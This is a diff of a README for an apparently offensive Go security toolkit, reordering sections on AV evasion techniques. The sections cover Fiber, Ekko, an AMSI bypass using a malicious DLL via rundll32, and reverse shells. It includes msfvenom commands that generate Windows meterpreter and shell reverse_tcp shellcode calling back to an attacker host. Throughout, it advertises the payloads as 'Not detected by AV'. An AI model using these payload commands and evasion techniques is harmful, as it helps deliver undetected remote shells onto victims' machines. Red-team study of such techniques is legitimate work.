@@ -48,6 +48,38 @@ $ sudo apt install xsel xclip gcc libc6-dev libx11-dev xorg-dev libxtst-dev libp
 5. copy \zlib\lib to \TDM\lib
 
 ## Basic Examples 🚀
+
+### Fiber
+
+#### Portable Executable (PE)
+
+- Meterpreter Staged Payload downladed from external web server with Evasion and Encryption Module implemented. **(UPDATE: Not detected by AV as of 23/05/2024)**
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.145 -o /tmp/payload.txt -b "\x00" EXITFUNC=thread LPORT=443 -f c
+```
+![](https://i.imgur.com/fwoBcKS.png)
+
+#### Video Demo
+
+[![Fiber](https://imgur.com/B5GhmV7.png)](https://i.imgur.com/edJttIV.mp4)
+
+### Ekko
+
+#### Portable Executable (PE)
+
+- Simple Go Reverse Shell applying the Ekko Technique. **(UPDATE: Not detected by AV as of 23/05/2024)**
+
+![](https://i.imgur.com/j5Npeis.png)
+
+#### Video Demo
+
+[![Ekko](https://imgur.com/wQQqXVi.png)](https://imgur.com/ZG5GeWb.mp4)
+
+### AMSI ByPass
+- AMSI ByPass with malicious dll using rundll32.exe **(UPDATE: Not detected by AV as of 23/05/2024)**
+  
+![](https://i.imgur.com/wuDFOb3.png)
+
 ### Simple Go Reverse Shell
 
 - Simple Golang connection **(UPDATE: Not detected by AV as of 19/03/2022)**
@@ -124,28 +156,6 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.21 -o /opt/Offen
 ```
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.21 -o /opt/Offensive-Golang/payload2.txt -b "\x00" EXITFUNC=thread LPORT=443 -f c --smallest
 ```
-### Fiber
-
-#### Portable Executable (PE)
-
-- Meterpreter Staged Payload downladed from external web server with Evasion and Encryption Module implemented. **(UPDATE: Not detected by AV as of 23/05/2024)**
-```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.145 -o /tmp/payload.txt -b "\x00" EXITFUNC=thread LPORT=443 -f c
-```
-![](https://i.imgur.com/fwoBcKS.png)
-
-### Ekko
-
-#### Portable Executable (PE)
-
-- Simple Go Reverse Shell applying the Ekko Technique. **(UPDATE: Not detected by AV as of 23/05/2024)**
-
-![](https://i.imgur.com/j5Npeis.png)
-
-### AMSI ByPass
-- AMSI ByPass with malicious dll using rundll32.exe **(UPDATE: Not detected by AV as of 23/05/2024)**
-  
-![](https://i.imgur.com/wuDFOb3.png)
 
 ### Persistence
 
